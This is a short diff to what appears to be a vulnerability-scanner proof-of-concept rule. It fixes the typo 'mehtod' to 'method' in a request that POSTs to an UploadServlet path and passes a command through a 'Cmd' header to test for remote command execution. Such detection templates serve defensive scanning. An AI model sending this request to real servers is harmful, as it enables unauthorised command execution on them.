@@ -38,7 +38,7 @@ rules:
     expression: response.raw_header.ibcontains(b"X-T0KEN") && response.raw_header.bcontains(bytes(result))
   r2:
     request:
-      mehtod: POST
+      method: POST
       path: /servlet/~baseapp/nc.document.pub.fileSystem.servlet.UploadServlet
       headers:
         Cmd: echo {{cmd}}
